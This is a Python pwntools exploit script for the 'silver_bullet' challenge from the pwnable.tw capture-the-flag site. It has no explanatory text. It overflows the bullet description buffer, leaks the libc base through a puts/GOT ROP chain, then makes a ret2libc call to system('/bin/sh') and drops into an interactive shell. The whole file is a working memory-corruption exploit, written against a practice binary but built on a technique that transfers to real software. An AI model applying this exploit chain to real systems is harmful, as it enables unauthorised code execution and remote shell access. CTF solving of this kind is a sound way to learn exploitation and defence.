from pwn import *

io = process('./silver_bullet')
#io = remote('chall.pwnable.tw', 10103)
#libc = ELF('libc_32.so.6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./silver_bullet')

def power_up(des):
    print(io.recvuntil(b'choice :'))
    io.sendline(b'2')
    print(io.recvuntil(b'description of bullet :'))
    io.sendline(des)

def beat():
    print(io.recv())
    io.sendline(b'3')

#--init--
print(io.recvuntil(b'choice :'))
io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)
#--------


#-- phase 1 - leak libc --
payload = b'A'
power_up(payload)
payload = b'A'*7+p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
a = io.recv()
print(a.split(b'\n'))
#-------------------------


#leak libc

libc.address = u32(a.split(b'\n')[1])-libc.sym['puts']
print('[+] Base libc: ', hex(libc.address))

#---------


#-- phase 2 - exploit --

io.sendline(b'1')
print(io.recvuntil(b'description of bullet :'))
init_pl = b'A'*47
io.sendline(init_pl)


payload = b'A'
power_up(payload)
payload = b'A'*7+p32(libc.sym['system'])+p32(libc.sym['exit'])+p32(next(libc.search(b'/bin/sh')))
power_up(payload)
beat()
print(io.recvuntil('Sorry ... It still alive !!'))
beat()
print(io.recvuntil('Oh ! You win !!'))
print(io.recv())
io.interactive()
#-------------------------
